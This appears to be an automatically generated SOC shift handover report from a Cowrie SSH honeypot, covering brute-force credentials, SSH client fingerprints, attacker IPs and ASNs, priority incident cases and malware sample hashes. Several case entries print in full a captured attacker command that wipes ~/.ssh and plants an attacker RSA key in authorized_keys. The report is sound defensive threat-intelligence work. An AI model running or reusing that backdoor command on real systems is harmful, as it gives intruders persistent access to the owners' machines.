# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-10 |
| **Generated At** | 2026-04-10T07:29:02Z |
| **Shift Time** | 07:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **37** |
| Confirmed Threats | **36** |
| False Positives Filtered | **1** (2.7%) |
| Unique Attacker IPs | **7** |
| Countries of Origin | **5** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **27** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **18** |
| Unique Credential Pairs | **11** |
| Unique Usernames | **6** |
| Unique Passwords | **11** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 4 |
| `admin` | 1 |
| `server` | 1 |
| `ubuntu` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 5 |
| `345gs5662d34` | 4 |
| `root#123` | 1 |
| `1qaz2wsx` | 1 |
| `server04` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `root#123` | 1 |
| `admin` | `1qaz2wsx` | 1 |
| `server` | `server04` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root#123` | `50.35.168.148` | 2026-04-10T05:56:54 |
| `root` | `3245gs5662d34` | `50.35.168.148` | 2026-04-10T05:57:11 |
| `root` | `qazwsx1234567!!` | `50.35.168.148` | 2026-04-10T06:07:07 |
| `root` | `woaini1314` | `50.35.168.148` | 2026-04-10T06:13:57 |
| `root` | `ubuntu18svm` | `50.35.168.148` | 2026-04-10T06:17:26 |
| `root` | `Mexico123` | `50.35.168.148` | 2026-04-10T06:27:47 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **37** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 20 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 20 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 20 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `50.35.168.148`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **7** |
| Unique ASNs | **7** |
| High-Risk ASNs | **6** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | MEDIUM |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | HIGH |
| `AS20055` | Wholesail networks LLC | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-734cebef6b94

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 05:56 |
| **Last Seen** | 2026-04-10 05:57 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:56:50` | `cowrie.session.connect` |
| `2026-04-10 05:56:50` | `cowrie.client.version` |
| `2026-04-10 05:56:50` | `cowrie.client.kex` |
| `2026-04-10 05:56:54` | `cowrie.login.success` |
| `2026-04-10 05:56:55` | `cowrie.session.params` |
| `2026-04-10 05:56:55` | `cowrie.command.input` |
| `2026-04-10 05:56:55` | `cowrie.command.failed` |
| `2026-04-10 05:56:56` | `cowrie.log.closed` |
| `2026-04-10 05:56:57` | `cowrie.session.params` |
| `2026-04-10 05:56:57` | `cowrie.command.input` |
| `2026-04-10 05:56:58` | `cowrie.session.file_download` |
| `2026-04-10 05:56:58` | `cowrie.log.closed` |
| `2026-04-10 05:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81d5d365bfda

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 05:57 |
| **Last Seen** | 2026-04-10 05:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 05:57:08` | `cowrie.session.connect` |
| `2026-04-10 05:57:08` | `cowrie.client.version` |
| `2026-04-10 05:57:09` | `cowrie.client.kex` |
| `2026-04-10 05:57:11` | `cowrie.login.success` |
| `2026-04-10 05:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6e7fe983148

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 06:07 |
| **Last Seen** | 2026-04-10 06:07 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 06:07:04` | `cowrie.session.connect` |
| `2026-04-10 06:07:04` | `cowrie.client.version` |
| `2026-04-10 06:07:05` | `cowrie.client.kex` |
| `2026-04-10 06:07:07` | `cowrie.login.success` |
| `2026-04-10 06:07:09` | `cowrie.session.params` |
| `2026-04-10 06:07:09` | `cowrie.command.input` |
| `2026-04-10 06:07:09` | `cowrie.command.failed` |
| `2026-04-10 06:07:09` | `cowrie.log.closed` |
| `2026-04-10 06:07:11` | `cowrie.session.params` |
| `2026-04-10 06:07:11` | `cowrie.command.input` |
| `2026-04-10 06:07:12` | `cowrie.session.file_download` |
| `2026-04-10 06:07:12` | `cowrie.log.closed` |
| `2026-04-10 06:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd6f08546c9c

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 06:07 |
| **Last Seen** | 2026-04-10 06:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 06:07:22` | `cowrie.session.connect` |
| `2026-04-10 06:07:22` | `cowrie.client.version` |
| `2026-04-10 06:07:25` | `cowrie.client.kex` |
| `2026-04-10 06:07:26` | `cowrie.login.success` |
| `2026-04-10 06:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-199837056275

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 06:13 |
| **Last Seen** | 2026-04-10 06:14 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 06:13:54` | `cowrie.session.connect` |
| `2026-04-10 06:13:54` | `cowrie.client.version` |
| `2026-04-10 06:13:55` | `cowrie.client.kex` |
| `2026-04-10 06:13:57` | `cowrie.login.success` |
| `2026-04-10 06:13:59` | `cowrie.session.params` |
| `2026-04-10 06:13:59` | `cowrie.command.input` |
| `2026-04-10 06:13:59` | `cowrie.command.failed` |
| `2026-04-10 06:13:59` | `cowrie.log.closed` |
| `2026-04-10 06:14:02` | `cowrie.session.params` |
| `2026-04-10 06:14:02` | `cowrie.command.input` |
| `2026-04-10 06:14:02` | `cowrie.session.file_download` |
| `2026-04-10 06:14:02` | `cowrie.log.closed` |
| `2026-04-10 06:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcb5825176ea

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 06:14 |
| **Last Seen** | 2026-04-10 06:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 06:14:09` | `cowrie.session.connect` |
| `2026-04-10 06:14:09` | `cowrie.client.version` |
| `2026-04-10 06:14:10` | `cowrie.client.kex` |
| `2026-04-10 06:14:13` | `cowrie.login.success` |
| `2026-04-10 06:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373ce3986d64

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 06:17 |
| **Last Seen** | 2026-04-10 06:17 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 06:17:23` | `cowrie.session.connect` |
| `2026-04-10 06:17:23` | `cowrie.client.version` |
| `2026-04-10 06:17:24` | `cowrie.client.kex` |
| `2026-04-10 06:17:26` | `cowrie.login.success` |
| `2026-04-10 06:17:27` | `cowrie.session.params` |
| `2026-04-10 06:17:27` | `cowrie.command.input` |
| `2026-04-10 06:17:27` | `cowrie.command.failed` |
| `2026-04-10 06:17:28` | `cowrie.log.closed` |
| `2026-04-10 06:17:29` | `cowrie.session.params` |
| `2026-04-10 06:17:29` | `cowrie.command.input` |
| `2026-04-10 06:17:30` | `cowrie.session.file_download` |
| `2026-04-10 06:17:30` | `cowrie.log.closed` |
| `2026-04-10 06:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcb705b203d8

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 06:17 |
| **Last Seen** | 2026-04-10 06:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 06:17:38` | `cowrie.session.connect` |
| `2026-04-10 06:17:38` | `cowrie.client.version` |
| `2026-04-10 06:17:39` | `cowrie.client.kex` |
| `2026-04-10 06:17:43` | `cowrie.login.success` |
| `2026-04-10 06:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07d85d2168b9

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 06:27 |
| **Last Seen** | 2026-04-10 06:28 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 06:27:43` | `cowrie.session.connect` |
| `2026-04-10 06:27:43` | `cowrie.client.version` |
| `2026-04-10 06:27:43` | `cowrie.client.kex` |
| `2026-04-10 06:27:47` | `cowrie.login.success` |
| `2026-04-10 06:27:48` | `cowrie.session.params` |
| `2026-04-10 06:27:48` | `cowrie.command.input` |
| `2026-04-10 06:27:48` | `cowrie.command.failed` |
| `2026-04-10 06:27:51` | `cowrie.log.closed` |
| `2026-04-10 06:27:51` | `cowrie.session.params` |
| `2026-04-10 06:27:51` | `cowrie.command.input` |
| `2026-04-10 06:27:53` | `cowrie.session.file_download` |
| `2026-04-10 06:27:53` | `cowrie.log.closed` |
| `2026-04-10 06:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d992f745f3cc

| Field | Detail |
|---|---|
| **Source IP** | `50.35.168[.]148` |
| **First Seen** | 2026-04-10 06:28 |
| **Last Seen** | 2026-04-10 06:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 06:28:00` | `cowrie.session.connect` |
| `2026-04-10 06:28:00` | `cowrie.client.version` |
| `2026-04-10 06:28:01` | `cowrie.client.kex` |
| `2026-04-10 06:28:03` | `cowrie.login.success` |
| `2026-04-10 06:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.35.168[.]148` to AbuseIPDB if not already reported
- [ ] Block `50.35.168[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.135.42[.]227` | **12** | 2026-04-10 06:03 | 2026-04-10 06:05 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `50.35.168[.]148` | **10** | 2026-04-10 05:56 | 2026-04-10 06:28 | 1m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.169.22[.]124` | 1 | 2026-04-10 07:25 | 2026-04-10 07:25 | 30s | 0 | `T1592` | 🟢 LOW |
| `115.95.176[.]182` | 1 | 2026-04-10 07:27 | 2026-04-10 07:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.62.87[.]241` | 1 | 2026-04-10 06:44 | 2026-04-10 06:44 | 8s | 0 | `T1592` | 🟢 LOW |
| `222.184.11[.]98` | 1 | 2026-04-10 06:45 | 2026-04-10 06:45 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 35/100 | 🟢 LOW | **15/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.169.22[.]124` | KR | Korea Telecom | **100** ⚠️ | 1 |
| `178.62.87[.]241` | GB | DigitalOcean London | **100** ⚠️ | 5 |
| `222.184.11[.]98` | CN | XuYi copyright | **100** ⚠️ | 10 |
| `115.95.176[.]182` | KR | LG DACOM Corporation | **100** ⚠️ | 23 |
| `139.135.42[.]227` | PK | Cyber Internet Services Pakistan | **100** ⚠️ | 11 |
| `50.35.168[.]148` | US | Ziply Fiber | **100** ⚠️ | 26 |
| `20.109.87[.]115` | US | Microsoft Corporation | **62** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 21 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |

---

